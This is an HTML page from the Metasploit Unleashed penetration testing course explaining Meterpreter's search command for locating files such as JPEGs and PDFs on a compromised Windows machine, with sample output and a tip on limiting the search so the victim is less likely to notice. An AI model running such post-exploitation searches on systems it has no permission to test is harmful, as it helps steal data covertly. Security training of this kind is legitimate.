<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Meterpreter Searching</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Meterpreter
Searching</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<a
 href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Searching#searchInput">search</a></div>
<p style="color: rgb(0, 0, 0);">Information leakage is one of the
largest threats that corporations
face and much of it can be prevented by educating users to properly
secure their data. Users being users though, will frequently save data
to their local workstations instead of on the corporate servers where
there is greater control.
</p>
<p style="color: rgb(0, 0, 0);">Meterpreter has a search function that
will, by default, scour
all drives of the compromised computer looking for files of your
choosing.
<br>
<br>
<u>meterpreter</u> &gt; search -h
Usage: search [-d dir] [-r recurse] -f pattern
Search for files.
</p>
<p style="color: rgb(0, 0, 0);">OPTIONS:
</p>
<pre style="color: rgb(0, 0, 0);">   -d &lt;opt&gt;  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )<br>   -f &lt;opt&gt;  The file pattern glob to search for. (e.g. *secret*.doc?)<br>   -h        Help Banner.<br>   -r &lt;opt&gt;  Recursivly search sub directories. (Default: true)<br></pre>
<p style="color: rgb(0, 0, 0);"><br>
To run a search for all jpeg files on the computer, simply run
the search command with the '-f' switch and tell it what filetype to
look for.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; search -f *.jpg<br>Found 418 results...<br>...snip...<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg (28521 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg (71189 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg (83794 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg (105542 bytes)<br>...snip...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Searching an entire computer can
take a great deal of time and
there is a chance that an observant user might notice their hard drive
thrashing constantly. We can reduce the search time by pointing it at a
starting directory and letting it run.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf<br>Found 2 results...<br>    c:\documents and settings\administrator\desktop\operations_plan.pdf (244066 bytes)<br>    c:\documents and settings\administrator\desktop\budget.pdf (244066 bytes)<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">By running the search this way, you
will notice a huge speed increase in the time it takes to complete.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
